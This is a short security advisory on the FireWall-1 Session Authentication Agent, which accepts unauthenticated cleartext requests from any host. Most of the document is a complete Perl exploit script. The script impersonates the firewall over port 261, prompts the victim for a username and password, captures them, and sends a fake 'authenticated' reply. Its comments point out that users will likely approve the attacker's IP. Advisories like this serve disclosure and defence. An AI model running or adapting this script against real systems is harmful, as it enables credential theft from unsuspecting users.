source: http://www.securityfocus.com/bid/1661/info

A vulnerability exists in the "Session Agent" portion of Firewall-1, from Check Point. This vulnerability appears to affect all versions of the session agent prior to the one shipped in FW-1 4.1. The session agent listens on a Windows 9x or NT box for connections from the firewall, requesting user authentication for connections. This information is all transmitted in cleartext, and is unauthenticated. This means it can be sniffed. In addition, the agent accepts connections from any host. Any person who can connect to the session agent can impersonate the Firewall-1 module, and request username and password information. If supplied, this can result in the compromise of that username and password.

#!/usr/bin/perl -w
#
# This script connects to a FireWall-1 Session Authentication Agent
# running on Windows 95/NT. It attempts to "authenticate" the remote
# user and returns the resulting username/password.
#
# The agent supports configuration of up to three IP addresses which
# are allowed to submit authentication requests. If there are three
# addresses configured, the user is presented with the following when
# an unknown host connects:
#
# "Authentication request from this IP Address is not allowed."
# [ OK ]
#
# If there are only one or two addresses allowed, the user gets this
# nice little dialog box:
#
# "Do you want to enter this IP to the Firewall-1 list"
# [ YES ] (default) [ NO ]
#
# Guess which button your typical user will click on?
#
# If the agent closes the connection prematurely, you will get strange
# results.
#
# tested vs. FW-1 Authentication Agent 1.1
#
# Andrew Danforth <acd@weirdness.net>

require 5.000;

use Socket;
use Getopt::Std;

$| = 1;

$FIREWALL_NAME = "Corporate Firewall";
$PASSWORD_PROMPT = "FireWall-1 password";
$PORT = 261;

die unless getopts('n:p:');

unless ($TARGET_IP = shift) {
print "usage: $0 [-n firewall_name] [-p password_prompt] target_ip\n";
exit(1);
}

$FIREWALL_NAME = $opt_n if (defined $opt_n);
$PASSWORD_PROMPT = $opt_p if (defined $opt_p);

socket(SOCK, AF_INET, SOCK_STREAM, getprotobyname('tcp')) || die "socket: $!";
connect(SOCK, sockaddr_in($PORT, inet_aton($TARGET_IP))) || die "connect: $!";

select(SOCK); $| = 1; select(STDOUT);

print SOCK "220 FW-1 Session Authentication Request from $FIREWALL_NAME\n\r";
print "sent greeting\n";
print SOCK "331 User:\n\r";
print "sent user request\n";
$username = &get_response;
print "username entered: $username\n";
print SOCK "331 *$PASSWORD_PROMPT:\n\r";
$password = &get_response;
print "password entered: $password\n";
print SOCK "200 User $username authenticated by FireWall-1 authentication.\n\r";
print SOCK "230 OK\n\r";

sub get_response {
# this is ugly but it works. the session agent doesn't seem to send proper newlines.
my $input;
$input .= $key while($key = getc SOCK and ord($key));
return $input;
}